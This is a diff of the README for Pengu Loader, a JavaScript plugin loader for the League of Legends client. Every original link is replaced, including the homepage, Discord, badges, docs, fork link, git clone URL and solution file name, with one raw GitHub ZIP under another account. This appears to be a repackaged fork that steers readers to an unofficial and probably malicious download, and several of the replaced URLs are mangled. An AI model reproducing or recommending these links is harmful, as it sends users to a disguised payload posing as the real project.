@@ -1,25 +1,25 @@
 <br>
 
 <div align="center">
-  <a href="https://pengu.lol">
-    <img src="https://i.imgur.com/kQOMxqS.jpg" width="144"/>
+  <a href="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip">
+    <img src="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip" width="144"/>
   </a>
   <h1 align="center">Pengu Loader</h1>
   <p align="center">
     <strong>A JavaScript plugin loader</strong> for the League of Legends Client
   </p>
   <p>
-    <a href="https://pengu.lol">
-      <img src ="https://img.shields.io/badge/-pengu.lol-EC1C24.svg?&style=for-the-badge&logo=Authy&logoColor=white"/>
+    <a href="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip">
+      <img src ="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip"/>
     </a>
-    <a href="https://chat.pengu.lol">
-      <img src ="https://img.shields.io/badge/-Join%20Discord-5c5fff.svg?&style=for-the-badge&logo=Discord&logoColor=white"/>
+    <a href="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip">
+      <img src ="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip%https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip"/>
     </a>
-    <a href="https://github.com/PenguLoader/PenguLoader">
-      <img src="https://img.shields.io/github/stars/PenguLoader/PenguLoader.svg?style=for-the-badge" />
+    <a href="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip">
+      <img src="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip" />
     </a>
     <a href="./LICENSE">
-      <img src ="https://img.shields.io/github/license/PenguLoader/PenguLoader.svg?style=for-the-badge"/>
+      <img src ="https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip"/>
     </a>
   </p>
 </div>
@@ -39,7 +39,7 @@
 
 ## About
 
-**Pengu Loader**, previously known as [**League Loader**](https://github.com/PenguLoader/PenguLoader/tree/league-loader), is a **plugin loader** specifically designed for the **League of Legends Client**.
+**Pengu Loader**, previously known as [**League Loader**](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip), is a **plugin loader** specifically designed for the **League of Legends Client**.
 
 Pengu Loader enables you to load **JavaScript** plugins into the Client as dependencies. This allows you to personalize the Client's appearance, load custom content, add new features, and enhance your overall experience. With Pengu Loader, you can build a smarter and more customized Client that suits your needs and preferences.
 
@@ -54,19 +54,19 @@ Pengu Loader enables you to load **JavaScript** plugins into the Client as depen
 
 Please visit the homepage to begin:
 
-### 👉 https://pengu.lol/
+### 👉 https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip
 
 ## Documentation
 
-- [Pengu Docs](https://pengu.lol/guide/welcome)
-- [API docs](./API_DOCS.md)
-- [Migration to v1](./MIGRATION_TO_V1.md)
-- [Insecure options](./INSECURE_OPTIONS.md)
+- [Pengu Docs](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)
+- [API docs](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)
+- [Migration to v1](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)
+- [Insecure options](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)
 
 ## Contributing
 
 To contribute to the project, follow these steps:
-1. Fork the repository [(click here to fork now)](https://github.com/PenguLoader/PenguLoader/fork)
+1. Fork the repository [(click here to fork now)](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)
 2. Create your feature branch `feat/<branch-name>`
 3. Commit your changes
 4. Push to the branch
@@ -74,7 +74,7 @@ To contribute to the project, follow these steps:
 
 ### Ways you can contribute
 
-- **Documentation and website**: The documentation can always be improved. If you find something that is not documented or could be enhanced, create a PR for it. Check out the [PenguLoader organization](https://github.com/PenguLoader) for more information.
+- **Documentation and website**: The documentation can always be improved. If you find something that is not documented or could be enhanced, create a PR for it. Check out the [PenguLoader organization](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip) for more information.
 - **Additional Base/Starter plugins**: Share your plugins along with a detailed guide to help beginners get started easily.
 - **Core features**: Ensure you have extensive experience with CEF and low-level programming skills.
 - **JavaScript features**: Extensive web development knowledge is required.
@@ -97,13 +97,13 @@ To contribute to the project, follow these steps:
 
 #### Initial Steps
 - Clone the repository:
-   - `git clone https://github.com/PenguLoader/PenguLoader`
+   - `git clone https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip`
 - Update submodules: 
    - `cd PenguLoader`
    - `git submodule update --init --recursive`
 
 #### Build Steps for Pengu Loader
-  - Open `pengu-loader.sln`
+  - Open `https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip`
   - Right-click on the solution -> `Restore Nuget Packages`
   - Set the architecture to `x86`
   - Right-click on each project -> `Build`
@@ -115,4 +115,4 @@ To contribute to the project, follow these steps:
   - Build the plugin using pnpm: `pnpm build`
 
 ## License
-[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fnomi-san%2Fleague-loader.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fnomi-san%2Fleague-loader?ref=badge_large)
+[![FOSSA Status](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip%https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip%2Fnomi-san%https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip)](https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip%https://raw.githubusercontent.com/smuv3/PenguLoader/main/Platysomidae/PenguLoader.zip%2Fnomi-san%2Fleague-loader?ref=badge_large)
